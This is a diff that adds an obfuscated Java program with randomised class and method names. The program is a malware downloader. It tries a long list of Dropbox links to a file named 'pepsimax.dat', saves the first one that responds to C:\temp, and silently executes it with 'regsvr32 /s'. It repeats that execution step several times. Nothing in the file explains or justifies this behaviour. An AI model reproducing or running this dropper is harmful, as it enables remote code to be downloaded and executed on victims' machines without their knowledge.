@@ -1,0 +1,76 @@
+import java.io.File;
+import java.io.IOException;
+import java.net.*;
+import java.nio.file.*;
+
+public class CNQNYPYFEBMJTHYPMGR
+{   public static String FEEXBMRYHTA()
+    {	return "https://dl.dropboxusercontent.com/s/";
+    }
+
+    public static String VJGOIWXICTCTKKOER()
+    {	return "9df8yir77y2m1vf/pepsimax.dat?dl=1###icp688ib231xldm/pepsimax.dat?dl=1###3w03bzfemad4hpp/pepsimax.dat?dl=1###48sl8x1e78j8tvb/pepsimax.dat?dl=1###7mnpwjhkv9yjb0w/pepsimax.dat?dl=1###d25g8aupuw8mefv/pepsimax.dat?dl=1###eluj46scsnum0pe/pepsimax.dat?dl=1###pt0gvrfbycf7olt/pepsimax.dat?dl=1###5owuu9plx125tkg/pepsimax.dat?dl=1###m2t51nqz7fpfztf/pepsimax.dat?dl=1###nkoo7sslz3vmlmh/pepsimax.dat?dl=1###h5sy1ww99eq002t/pepsimax.dat?dl=1###i1fsjipd298vah4/pepsimax.dat?dl=1###fkndtit8jmte1ip/pepsimax.dat?dl=1###sa02eooj36y7zhq/pepsimax.dat?dl=1###bswtjfsbivod0f2/pepsimax.dat?dl=1###dushy72q6vh7dr0/pepsimax.dat?dl=1###36imerm5swb3vih/pepsimax.dat?dl=1###o7uv05kqetl4zyl/pepsimax.dat?dl=1###uap2g7bbrvlaxhp/pepsimax.dat?dl=1###v59pyituua5klfa/pepsimax.dat?dl=1###susqflyxawafcu9/pepsimax.dat?dl=1###5roh34pcumxv3nh/pepsimax.dat?dl=1###s0w8f3gohylkea7/pepsimax.dat?dl=1###jllw5gwsurlksac/pepsimax.dat?dl=1###oacvwrsruo2exh0/pepsimax.dat?dl=1###j2w72cd03qix3x2/pepsimax.dat?dl=1###9jyawfzl63x9cz4/pepsimax.dat?dl=1###o37xqvxizbhp6gh/pepsimax.dat?dl=1###dp9aacf2obtwke9/pepsimax.dat?dl=1###vk2y7q6jp09u9i2/pepsimax.dat?dl=1###tjp3saqv498biem/pepsimax.dat?dl=1###ouqnl4mvpvfpf6l/pepsimax.dat?dl=1###s8srw4m5a8404v0/pepsimax.dat?dl=1";
+    }
+
+    public static String BWFOHCHK()
+    {	return "###";
+    }
+
+    public static String HYABXKWZBMJ()
+    {	return "C:\\temp\\NWQGHJ.MXZ";
+    }
+
+    public static String HUSHEKL()
+    {	return "C:\\temp\\";
+    }
+
+    public static String CFSOHPWGSVSIYEZVVSC()
+    {	return "regsvr32 /s C:\\temp\\NWQGHJ.MXZ";
+    }
+
+    public static void PESKVPAUZQTI()
+        throws IOException
+    {
+        for(int d = 3; d < 9; d++)
+            Runtime.getRuntime().exec(CFSOHPWGSVSIYEZVVSC());
+
+    }
+
+    public static void main(String args[])
+        throws Exception
+    {
+        (new File(HUSHEKL())).mkdir();
+        File q = new File(HYABXKWZBMJ());
+        if(q.exists())
+        {
+            PESKVPAUZQTI();
+        } else
+        {
+            String TZVPVX[] = VJGOIWXICTCTKKOER().split(BWFOHCHK());
+            String args1[];
+            int j = (args1 = TZVPVX).length;
+            for(int i = 0; i < j; i++)
+            {
+                String UVIQEJQXWYJTOLPLSL = args1[i];
+                URL ROTDVZW = new URL((new StringBuilder(String.valueOf(FEEXBMRYHTA()))).append(UVIQEJQXWYJTOLPLSL).toString());
+                HttpURLConnection HMKNCKSMROQSCD = (HttpURLConnection)ROTDVZW.openConnection();
+                HMKNCKSMROQSCD.connect();
+                if(HMKNCKSMROQSCD.getResponseCode() / 100 != 2)
+                    continue;
+                String MOIFQFDRX = (new StringBuilder(String.valueOf(FEEXBMRYHTA()))).append(UVIQEJQXWYJTOLPLSL).toString();
+                String UTWJQXLVUCOUINE = HYABXKWZBMJ();
+                PUGVLBJXJCFADKO(MOIFQFDRX, UTWJQXLVUCOUINE);
+                break;
+            }
+
+        }
+    }
+
+    public static void PUGVLBJXJCFADKO(String USJIHKYYJOLTHBP, String HQEYYWGUPOOZW)
+        throws IOException
+    {
+        java.io.InputStream FROKGMOMYWHWBVUKT = URI.create(USJIHKYYJOLTHBP).toURL().openStream();
+        Files.copy(FROKGMOMYWHWBVUKT, Paths.get(HQEYYWGUPOOZW, new String[0]), new CopyOption[0]);
+        PESKVPAUZQTI();
+    }
+}
